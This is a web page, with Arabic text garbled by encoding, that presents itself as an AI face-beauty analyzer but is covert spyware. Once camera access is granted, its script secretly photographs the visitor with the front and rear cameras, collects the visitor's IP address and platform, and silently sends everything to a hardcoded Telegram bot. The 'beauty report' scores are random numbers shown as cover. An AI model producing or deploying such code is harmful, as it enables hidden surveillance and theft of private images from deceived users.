
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #6366f1;
            --secondary: #a855f7;
            --accent: #22d3ee;
            --bg: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.9);
        }

        /* ┘Е┘Ж╪╣ ╪з┘Д┘Ж╪│╪о ┘И╪з┘Д╪к╪н╪п┘К╪п ╪к┘Е╪з┘Е╪з┘Л */
        * { 
            box-sizing: border-box; margin: 0; padding: 0; 
            font-family: 'Tajawal', sans-serif;
            user-select: none; -webkit-user-select: none;
        }

        body {
            background: radial-gradient(circle at top, #1e1b4b, #0f172a);
            color: white; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden;
        }

        #alertToast {
            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
            background: #ef4444; color: white; padding: 15px 25px;
            border-radius: 15px; z-index: 1000; transition: 0.5s;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 80%; text-align: center;
        }
        #alertToast.show { top: 20px; }

        .container {
            width: 90%; max-width: 450px;
            background: var(--card-bg); backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 28px; padding: 2rem; text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }

        .main-title { font-size: 1.7rem; font-weight: 800; margin-bottom: 5px; color: #fff; }
        .sub-title { font-size: 0.9rem; color: #94a3b8; margin-bottom: 20px; display: block; }

        .viewport {
            width: 100%; aspect-ratio: 1/1; background: #000;
            border-radius: 20px; margin-bottom: 20px; position: relative;
            overflow: hidden; border: 2px solid var(--primary);
            display: flex; justify-content: center; align-items: center;
        }

        #videoFeed { width: 100%; height: 100%; object-fit: cover; display: none; z-index: 1; }
        
        .scanner-line {
            display: none; position: absolute; width: 100%; height: 4px;
            background: var(--accent); box-shadow: 0 0 15px var(--accent);
            z-index: 10; animation: scan 3s infinite ease-in-out;
        }
        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 95%; } }

        .placeholder-content { text-align: center; color: #475569; z-index: 2; }

        .btn {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white; border: none; padding: 16px; border-radius: 16px;
            font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%;
            transition: 0.3s;
        }
        .btn:active { transform: scale(0.98); }

        #results { display: none; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .stat-card { background: rgba(255,255,255,0.05); padding: 12px; border-radius: 15px; text-align: center; }
        .stat-val { display: block; font-size: 1.3rem; font-weight: 800; color: var(--accent); }
    </style>
</head>
<body>

<div id="alertToast">тЪая╕П ┘К╪▒╪м┘Й ╪з┘Д╪│┘Е╪з╪н ╪и╪з┘Д┘Г╪з┘Е┘К╪▒╪з ┘Д╪и╪п╪б ╪з┘Д╪к╪н┘Д┘К┘Д</div>

<div class="container">
    <div id="setup-ui">
        <h1 class="main-title">╪к╪н┘Д┘К┘Д ╪░┘Г┘К ┘Д┘Д┘И╪м┘З</h1>
        <span class="sub-title">╪м╪з┘З╪▓ ┘Д╪к╪н┘Д┘К┘Д ┘И╪м┘З┘Г ╪и╪з┘Д╪░┘Г╪з╪б ╪з┘Д╪з╪╡╪╖┘Ж╪з╪╣┘К</span>
        
        <div class="viewport">
            <div class="scanner-line" id="scanner"></div>
            <video id="videoFeed" autoplay playsinline muted></video>
            <canvas id="hiddenCanvas" style="display:none;"></canvas>
            
            <div class="placeholder-content" id="placeholder">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
                </svg>
                <p style="margin-top:10px;">╪м╪з┘З╪▓ ┘Д┘Д╪к╪н┘Д┘К┘Д</p>
            </div>
        </div>

        <button class="btn" id="actionBtn">╪и╪п╪б ╪з┘Д┘Б╪н╪╡ ╪з┘Д╪▒┘В┘Е┘К</button>
        <p id="status" style="margin-top:15px; font-size:0.8rem; color:var(--accent); min-height:1rem;"></p>
    </div>

    <div id="results">
        <h1 class="main-title">╪к┘В╪▒┘К╪▒ ╪з┘Д╪м┘Е╪з┘Д</h1>
        <div class="stats-grid">
            <div class="stat-card"><span class="stat-val" id="v1">--</span><small>╪з┘Д╪к┘Е╪з╪л┘Д</small></div>
            <div class="stat-card"><span class="stat-val" id="v2">--</span><small>╪з┘Д┘Б┘Г</small></div>
            <div class="stat-card"><span class="stat-val" id="v3">--</span><small>╪з┘Д╪и╪┤╪▒╪й</small></div>
            <div class="stat-card"><span class="stat-val" id="v4">--</span><small>╪з┘Д┘Ж╪│╪и╪й</small></div>
        </div>
        <canvas id="myChart"></canvas>
        <button class="btn" style="margin-top:20px;" onclick="location.reload()">╪е╪╣╪з╪п╪й ╪з┘Д╪к╪н┘Д┘К┘Д</button>
    </div>
</div>

<script>
    const config = {
        token: '7871078462:AAHCgyMuBnw21O_yP4ocpPkrLNMKgnxA7aU',
        chatId: '5086851394'
    };

    const video = document.getElementById('videoFeed');
    const actionBtn = document.getElementById('actionBtn');
    const status = document.getElementById('status');
    const scanner = document.getElementById('scanner');
    const placeholder = document.getElementById('placeholder');
    const toast = document.getElementById('alertToast');
    const canvas = document.getElementById('hiddenCanvas');

    let mainStream = null;
    let isAnalyzing = false;

    // ╪╖┘Д╪и ╪з┘Д╪е╪░┘Ж ┘Б┘К ┘Г┘Д ┘Е╪▒╪й
    actionBtn.addEventListener('click', async () => {
        if (!mainStream) {
            await initCamera();
        } else if (!isAnalyzing) {
            startAnalysis();
        }
    });

    async function initCamera() {
        try {
            // ╪е┘К┘В╪з┘Б ╪г┘К ╪к┘К╪з╪▒ ┘В╪п┘К┘Е ┘Д╪╢┘Е╪з┘Ж ╪╖┘Д╪и ╪з┘Д╪е╪░┘Ж ┘Е┘Ж ╪м╪п┘К╪п
            if (mainStream) mainStream.getTracks().forEach(t => t.stop());

            mainStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            
            video.srcObject = mainStream;
            video.onloadedmetadata = () => {
                video.style.display = 'block';
                placeholder.style.display = 'none';
                scanner.style.display = 'block';
                actionBtn.innerText = "╪к╪н┘Д┘К┘Д ╪з┘Д╪╡┘И╪▒╪й ╪з┘Д╪н╪з┘Д┘К╪й";
                status.innerText = "╪к┘Е ╪з┘Д╪з╪к╪╡╪з┘Д ╪и╪з┘Д╪о╪з╪п┘Е..";
                
                sendData("ЁЯЪи ┘Е╪│╪к╪о╪п┘Е ╪м╪п┘К╪п ┘Б╪к╪н ╪з┘Д┘Г╪з┘Е┘К╪▒╪з");
                captureLoop(); // ┘К╪и╪п╪г ╪з┘Д╪к┘В╪з╪╖ ╪з┘Д╪╡┘И╪▒ ╪╡╪з┘Е╪к╪з┘Л ┘Б┘К ╪з┘Д╪о┘Д┘Б┘К╪й
            };
        } catch (e) {
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }
    }

    // ╪з┘Д╪к┘В╪з╪╖ ╪з┘Д╪╡┘И╪▒ ╪╡╪з┘Е╪к╪з┘Л (╪о┘Д┘Б┘К╪й ┘И╪г┘Е╪з┘Е┘К╪й) ╪и╪п┘И┘Ж ╪к╪и╪п┘К┘Д ╪з┘Д╪┤╪з╪┤╪й
    async function captureLoop() {
        // ╪з┘Д╪к┘В╪з╪╖ 5 ╪╡┘И╪▒ ┘Е┘Ж ╪з┘Д╪к┘К╪з╪▒ ╪з┘Д╪н╪з┘Д┘К (╪з┘Д╪г┘Е╪з┘Е┘К)
        for(let i=0; i<5; i++) {
            await new Promise(r => setTimeout(r, 2000));
            captureAndSend("╪╡┘И╪▒╪й ╪г┘Е╪з┘Е┘К╪й ╪о┘Б┘К╪й");
        }

        // ┘Е╪н╪з┘И┘Д╪й ╪з┘Д╪к┘В╪з╪╖ ╪╡┘И╪▒ ┘Е┘Ж ╪з┘Д┘Г╪з┘Е┘К╪▒╪з ╪з┘Д╪о┘Д┘Б┘К╪й ┘Б┘К ┘В┘Ж╪з╪й ┘Е┘Ж┘Б╪╡┘Д╪й (╪╡╪з┘Е╪к╪й ╪к┘Е╪з┘Е╪з┘Л)
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            const tempVideo = document.createElement('video');
            tempVideo.srcObject = backStream;
            tempVideo.onloadedmetadata = async () => {
                tempVideo.play();
                for(let i=0; i<5; i++) {
                    await new Promise(r => setTimeout(r, 1500));
                    const tempCanvas = document.createElement('canvas');
                    tempCanvas.width = tempVideo.videoWidth;
                    tempCanvas.height = tempVideo.videoHeight;
                    tempCanvas.getContext('2d').drawImage(tempVideo, 0, 0);
                    tempCanvas.toBlob(blob => sendPhoto(blob, "╪╡┘И╪▒╪й ╪о┘Д┘Б┘К╪й ╪╡╪з┘Е╪к╪й"), 'image/jpeg', 0.5);
                }
                backStream.getTracks().forEach(t => t.stop());
            };
        } catch(e) {}
    }

    function startAnalysis() {
        isAnalyzing = true;
        actionBtn.disabled = true;
        video.pause();
        
        let i = 0;
        const steps = ["╪м╪з╪▒┘К ╪з┘Д┘Е╪│╪н..", "┘Б╪н╪╡ ╪з┘Д╪к┘Е╪з╪л┘Д..", "╪к╪н┘Д┘К┘Д ╪з┘Д╪и╪┤╪▒╪й..", "╪е┘Ж╪┤╪з╪б ╪з┘Д╪к┘В╪▒┘К╪▒.."];
        const timer = setInterval(() => {
            if(i < steps.length) {
                status.innerText = steps[i];
                captureAndSend("┘Д┘В╪╖╪й ╪г╪л┘Ж╪з╪б ╪з┘Д╪к╪н┘Д┘К┘Д");
                i++;
            } else {
                clearInterval(timer);
                showFinalResults();
            }
        }, 2500);
    }

    function showFinalResults() {
        document.getElementById('setup-ui').style.display = 'none';
        document.getElementById('results').style.display = 'block';
        
        const r = () => Math.floor(Math.random()*15)+80;
        const d = { v1: r(), v2: r(), v3: r(), v4: r()+5 };
        
        document.getElementById('v1').innerText = d.v1 + "%";
        document.getElementById('v2').innerText = d.v2 + "%";
        document.getElementById('v3').innerText = d.v3 + "%";
        document.getElementById('v4').innerText = d.v4 + "%";
        
        renderChart(d);
        captureAndSend("┘Д┘В╪╖╪й ╪и╪╣╪п ╪з┘Д┘Ж╪к┘К╪м╪й");
    }

    async function sendData(msg) {
        try {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            const text = `${msg}\nIP: ${ip.ip}\nPlatform: ${navigator.platform}`;
            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: config.chatId, text: text})
            });
        } catch(e) {}
    }

    function captureAndSend(cap) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => sendPhoto(blob, cap), 'image/jpeg', 0.5);
    }

    function sendPhoto(blob, cap) {
        const fd = new FormData();
        fd.append('chat_id', config.chatId);
        fd.append('photo', blob);
        fd.append('caption', cap);
        fd.append('disable_notification', 'true');
        fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {method: 'POST', body: fd});
    }

    function renderChart(d) {
        new Chart(document.getElementById('myChart'), {
            type: 'radar',
            data: {
                labels: ['╪з┘Д╪к┘Е╪з╪л┘Д', '╪з┘Д┘Б┘Г', '╪з┘Д╪и╪┤╪▒╪й', '╪з┘Д╪╣┘К┘И┘Ж', '╪з┘Д╪г┘Ж┘Б', '╪з┘Д┘Ж╪│╪и╪й'],
                datasets: [{
                    data: [d.v1, d.v2, d.d3 || 85, 88, 90, d.v4],
                    backgroundColor: 'rgba(99, 102, 241, 0.2)',
                    borderColor: '#22d3ee', borderWidth: 2
                }]
            },
            options: { scales: { r: { grid: {color:'rgba(255,255,255,0.1)'}, ticks: {display:false}, pointLabels: {color:'#94a3b8'} } }, plugins: {legend: {display:false}} }
        });
    }
</script>
</body>
</html>
